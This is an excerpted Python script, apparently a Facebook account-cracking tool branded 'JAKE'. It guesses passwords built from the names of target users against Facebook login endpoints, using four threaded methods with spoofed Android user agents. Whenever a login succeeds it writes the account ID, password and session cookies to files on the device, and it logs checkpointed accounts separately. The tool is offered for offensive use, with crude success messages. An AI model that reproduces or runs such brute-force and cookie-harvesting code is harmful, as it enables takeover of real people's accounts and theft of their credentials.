...
from concurrent.futures import ThreadPoolExecutor as JAKESUJAKE
from string import * 
...
model3 = requests.get('https://raw.githubusercontent.com/JAKEsuPH/models/main/4kM.txt').text.splitlines()   
totaldmp = 0
count = 0
loop = 0
oks = []
...
#-------ua------
def JAKE6():
    END = 'FBAN/Orca-Android;FBAV/44.0.0.4935;FBBV/4403699[FBAN/Orca-Android;FBAV/250.0.0.26.241;FBBV/187584912;FBDM/{density=2.625,width=1080,height=1794};FBLC/en_US;FBCR/Airtel;FBMF/WIKO;FBBD/WIKO;FBPN/com.facebook.orca;FBDV/W-K610-SUI;FBSV/9;nullFBCA/armeabi-v7a:armeabi;]'
...
sys.stdout.write('\x1b]2; JAKEPOGI\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;35m╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
 ...
 \033[1;32mv1.8\033[1;31m•
\033[1;37m------------------------------------------------
\033[1;37m Facebook:Jake wu 
\033[1;37m status : personal use
\033[1;37m------------------------------------------------\033[97;1m"""
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back JAKE Menu ")
        exit()
...
def JAKESU():   
    ...
    if select =='1':
        ...
        exit('\033[1;34m deletes files coming soon')
        pass
    elif select =='FUckhahaha':
...
def method_JAKE():
    global methods
    clear()
    print('all methods working ud by :jakewu')
    print(f'[1] Method {1}')
    print(f'[2] Method {2}')
    print(f'[3] Method {3}')
    print(f'[4] Method {4}')
...
class main_JAKE():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[jake-cracked] | M1 OK | CP {len(oks)}/{len(cps)} | {loop} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])#;JAKEb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={JAKEb};{ckkk}"
                    print(f"\r\r\033[97;1m=======================[JAKE]======================")
                    ...
                    print(f"\033[97;1m=======================[JAKE]======================")                   
                    oks.append(sid)
                    open('/sdcard/jake_ok_ids_m1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/JAKE_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')
                    os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  id"')
                    break
                elif 'www.facebook.com' in q['error']['message']:   
                     #print(f"\r{A} [JAKE-CP] {sid} | {ps} {S}")
                     #os.system('espeak -a 300 " oh shit Cp ID"')
                     cps.append(sid)
                     open('/sdcard/JAKE_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[jake-cracked] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);JAKEb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={JAKEb};{ckkk}"
                    print(f"\r{R} [jake-OK] {sid} {S}")
                    print(f"\r{R} [password] {ps} {S}")                    
                    os.system('espeak -a 300 "HEY, SHIT, YOU,  GOT,  A,  FUCK,  id"')
                    oks.append(sid)
                    open('/sdcard/jake_ok_ids_m3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/JAKE_iDs_COOKiEs_M3.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r{A} [JAKE-CP] {sid} | {ps} {S}")
                    #os.system('espeak -a 300 " oh shit Cp ID"')
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[cracking] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);JAKEb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={JAKEb};{ckkk}"
                    print(f"\r{R} [jake-OK] {sid} | {ps} {S}")
                    os.system('espeak -a 300 "HEY, SHIT, YOU,  GOT,  A,  FUCK,  id"')
                    oks.append(sid)
                    open('/sdcard/jake_ok_ids_m2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/JAKE_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r{A} [JAKE-CP] {sid} | {ps} {S}")
                    #os.system('espeak -a 300 " oh shit Cp ID"')
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[JAKE] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in session.cookies["session_cookies"]);JAKEb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={JAKEb};{ckkk}"
                    print(f"\r{R} [jake-OK] {sid} | {ps} {S}")
                    os.system('espeak -a 300 "HEY, SHIT, YOU,  GOT,  A,  FUCK,  id"')
                    oks.append(sid)
                    open('/sdcard/jake_ok_ids_m4.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/JAKE._KUKI_m4.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    #print(f"\r{A} [JAKE] {sid} | {ps} {S}")
                    os.system('espeak -a 300 " oh shit Cp ID"')
                    cps.append(sid)
                    open('/sdcard/JAKE_CP.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(f'{S} Saved files in /sdcard/jake-OKS_M(methods thats you use)')
            print(47*"-")
            with JAKESUJAKE(max_workers=30) as JAKEworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                JAKEworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                JAKEworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                JAKEworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                JAKEworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
JAKESU()
